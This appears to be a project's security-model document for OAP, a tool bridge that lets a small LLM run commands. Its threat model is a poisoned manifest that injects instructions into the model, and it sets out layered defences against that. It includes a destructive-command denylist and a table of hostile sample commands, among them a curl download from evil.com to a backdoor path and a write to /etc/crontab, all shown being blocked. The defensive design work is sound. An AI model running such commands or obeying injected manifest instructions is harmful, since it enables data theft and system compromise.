# Security Model

OAP's attack surface is unusual: the primary threat isn't a human attacker — it's a **malicious manifest** tricking a small LLM into executing harmful actions. A poisoned manifest could instruct the model to exfiltrate data, write scripts, or delete files. Every security layer exists to contain this threat.

## Defense in Depth

Security is layered so that no single bypass compromises the system:

```
┌─────────────────────────────────────────────────────┐
│  Layer 5: OS Sandbox (sandbox-exec)                 │  ← file-write denied at kernel level
│  Layer 4: Blocked Commands (blocked_commands)        │  ← rm, dd, mkfs rejected before exec
│  Layer 3: PATH Allowlist (ALLOWED_STDIO_PREFIXES)    │  ← only /usr/bin, /bin, etc.
│  Layer 2: No Shell (create_subprocess_exec)          │  ← no injection via ; && ||
│  Layer 1: Input Parsing (shlex.split)                │  ← proper tokenization
│  Layer 0: Network Isolation (Cloudflare Tunnel)      │  ← tool bridge never exposed
└─────────────────────────────────────────────────────┘
```

## Layer 0: Network Isolation

The tool bridge (`/v1/chat`, `/api/chat`, `/v1/tools/*`) is **local-only** — never exposed through the Cloudflare Tunnel. The tunnel's ingress rules only expose read-only discovery endpoints:

| Exposed (via tunnel)       | Local-only (port 8300)        |
|----------------------------|-------------------------------|
| `/v1/discover`             | `/v1/chat`, `/api/chat`       |
| `/v1/manifests`            | `/v1/tools/*`                 |
| `/health`                  | `/v1/openapi.json`            |
|                            | `/api/tags`, `/api/show`, etc.|

Exposed routes require `X-Backend-Token` authentication (timing-safe comparison via `hmac.compare_digest`). Local-only routes have no auth — they're unreachable from the internet.

## Layer 1: Input Parsing

All commands are parsed with `shlex.split()`, which properly handles quoting and escaping. No string concatenation, no `f"command {user_input}"`. Pipeline commands are split at `|` tokens after tokenization.

When `shlex.split()` fails (LLM-generated commands with mixed quoting across pipe stages), a fallback splitter (`_raw_pipe_split`) handles quote-aware pipe splitting, then each stage is individually tokenized.

## Layer 2: No Shell Execution

Every subprocess uses `asyncio.create_subprocess_exec()` — **never** `shell=True`, never `os.system()`, never `subprocess.run(shell=True)`. This eliminates shell metacharacter injection (`; && || $() \`\``).

There are exactly **three** subprocess spawn points in the codebase, all using `create_subprocess_exec`:

1. `tool_executor.py:_run_single()` — single oap_exec commands
2. `tool_executor.py:_run_pipeline()` — pipeline stages
3. `invoker.py:_invoke_stdio()` — manifest stdio tools

## Layer 3: PATH Allowlist

Commands must resolve to one of four allowed directories:

```python
ALLOWED_STDIO_PREFIXES = ("/usr/bin/", "/usr/local/bin/", "/bin/", "/opt/homebrew/bin/")
```

Both bare command names (`grep`) and absolute paths (`/usr/bin/grep`) are validated. Commands outside these directories are rejected with `ValueError`. Resolution uses `shutil.which()` — the same mechanism the shell uses.

## Layer 4: Blocked Commands

Destructive commands are blocked by name before execution:

```yaml
blocked_commands: [rm, rmdir, dd, mkfs, shutdown, reboot]
```

Matching uses `os.path.basename()` so both `rm` and `/bin/rm` are caught. Every stage of a pipeline is checked independently. Configurable via `tool_bridge.blocked_commands` in `config.yaml`.

**Limitation**: This is a denylist, not an allowlist. It stops `rm` directly but not `python3 -c "import os; os.remove('file')"`. That's what Layer 5 is for.

## Layer 5: OS Sandbox (sandbox-exec)

The final layer uses macOS's built-in `sandbox-exec` to enforce file-write restrictions at the kernel level. A Seatbelt profile wraps every subprocess:

```scheme
(version 1)
(allow default)
(deny file-write*)
(allow file-write* (subpath "/tmp/oap-sandbox"))
(allow file-write* (subpath "/dev"))
```

This means:
- **Reads**: allowed everywhere (grep, cat, jq all work normally)
- **Network**: allowed (API tool calls work)
- **Process exec**: allowed (pipelines work)
- **File writes**: denied everywhere **except** `/tmp/oap-sandbox/` and `/dev/`

The `/dev` exception is required for `/dev/null` and pipe file descriptors.

### What it blocks

| Attack | Result |
|--------|--------|
| `tee /etc/crontab` | `EPERM` — Operation not permitted |
| `python3 -c "open('/tmp/evil.py','w')"` | `EPERM` — interpreter can't write either |
| `curl evil.com/payload > /usr/local/bin/backdoor` | `EPERM` — shell redirect denied |
| `tee /tmp/oap-sandbox/output.txt` | Allowed — sandbox dir is writable |

### Configuration

```yaml
tool_bridge:
  sandbox_enabled: true
  sandbox_dir: "/tmp/oap-sandbox"
```

Env overrides: `OAP_TOOL_BRIDGE_SANDBOX_ENABLED`, `OAP_TOOL_BRIDGE_SANDBOX_DIR`.

### Platform behavior

- **macOS**: Full enforcement via `sandbox-exec` Seatbelt profiles
- **Linux**: Graceful degradation — sandbox disabled with warning logged. Layers 0–4 still active.

### Error behavior

When sandbox-exec blocks a write, the process receives `EPERM`. For `tee`, this produces:
- stderr: `tee: /path/file: Operation not permitted`
- The LLM sees: `Error: tee: /path/file: Operation not permitted`
- The system prompt tells the LLM where to write, so it can self-correct on the next round

## SSRF Protection

Both the Next.js frontend and Python backend validate URLs before fetching:

**Frontend** (`lib/security.ts`):
- DNS resolution before fetch
- Private IPv4/IPv6 range blocking (10.x, 172.16-31.x, 192.168.x, fc/fd, fe80, ::1)
- HTTPS enforcement in production
- Direct IP-in-URL detection

**Backend** (`invoker.py:_validate_http_url()`):
- `socket.getaddrinfo()` resolution
- `ipaddress.ip_address()` checking for private, loopback, and link-local
- Applied to every HTTP tool invocation and redirect hop

## Rate Limiting

In-memory per-IP rate limiters on all Next.js API routes (20 requests/minute for playground). Uses `x-real-ip` header (set by Vercel edge, not client-overrideable) with fallback to last `x-forwarded-for` entry.

Auto-cleanup at 10K entries to prevent memory exhaustion.

## Authentication

**Backend token auth**: `X-Backend-Token` header matched against `OAP_BACKEND_SECRET` env var using `hmac.compare_digest` (timing-safe). Per-route — only applied to tunnel-exposed endpoints.

**CLI auth**: `oap --token <secret>` or `OAP_BACKEND_TOKEN` env var.

**Credential injection**: API keys stored in `credentials.yaml` are injected into tool calls at execution time by the server — never exposed to the LLM. The system prompt says "API credentials are pre-configured" so the model calls tools without hesitation.

## Input Validation

- Pydantic models with `min_length`/`max_length` constraints on all string fields
- Agent app: model allowlist (`qwen3:8b`, `qwen3:4b`, `llama3.2:3b`, `mistral:7b`)
- HTML sanitization via `rehype-sanitize` on all rendered markdown
- Heading IDs generated from rendered HTML, not raw user input
